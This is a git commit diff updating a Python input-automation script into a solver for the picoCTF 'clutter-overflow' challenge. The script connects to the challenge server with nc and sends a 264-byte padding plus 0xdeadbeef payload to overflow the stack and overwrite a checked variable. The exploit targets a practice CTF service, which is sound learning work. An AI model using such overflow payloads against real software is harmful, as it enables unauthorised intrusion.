9720e50d2e9d48b1ef2b894c6d824ce1307a5cd7
Brian Chau <brian.chau@outlook.com>
2022-03-27 19:29:05 -0700

    Updated "input_automator.py" script

--- python/input_automator/ia.py
+++ python/input_automator/ia.py
@@ -1,7 +1,9 @@
 import subprocess as sp
 import sys
+from   time import sleep
 
-prompt_string = "What number would you like to guess?"
+prompt_string  = "What do you see?"
+success_string = "how did that happen?"
 
 def terminated_read( fd, terminators ):
     buf = []
@@ -13,34 +15,44 @@ def terminated_read( fd, terminators ):
     return ''.join( buf )
 
 def submit_input( process, input ):
-    print(input)
-    process.stdin.write((input + '\n').encode('utf-8'))
+    process.stdin.write( input + b'\n' )
     process.stdin.flush()
-
-def check_output( output ):
-    return "Nope!" in output
 
 def read_prompt( process ):
     output = ''
-    send_next_input = True
     while prompt_string not in output:
         output = terminated_read( process.stdout, "?" ).strip()
-        send_next_input = check_output( output )
         print( output )
-    return send_next_input
+        if success_string in output:
+            while True:
+                print( proc.stdout.read( 100 ).decode('utf-8') )
+
+                # This makes sure it doesn't keep printing a bunch of blank lines
+                sleep( 1 )
+
+    return True
 
 if __name__ == '__main__':
-    app = ['./vuln']
-    if len( sys.argv ) > 1 :
+    # ./vuln1 and the following input were borrowed from the "clutter-overflow" challenge in picoCTF
+    #app = ['./vuln1']
+    app = ['nc', 'mars.picoctf.net', '31890']
+
+    # This application takes in an optional argument of the application to exploit
+    if len( sys.argv ) > 1:
         app = sys.argv[1:]
 
+    # Communicate with the subprocess
     proc = sp.Popen(app, shell=False, bufsize=0,
                     stdin = sp.PIPE,
                     stdout = sp.PIPE,
                     stderr = sp.PIPE)
 
-    for i in range(1, 8196, 1):
-        send_next_input = False
-        while send_next_input == False:
-            submit_input( proc, str(i) )
-            send_next_input = read_prompt( proc )
+    # This converts a hex number to a little-endian byte string
+    n = 0xdeadbeef
+    n = n.to_bytes( ( n.bit_length() + 7 ) // 8, 'little' ) or b'\0'
+
+    # This overflows the stack, then overwrites the check that compares a variable against "0xdeadbeef"
+    submit_input( proc, b'a' * 264 + n )
+
+    while True:
+        read_prompt( proc )
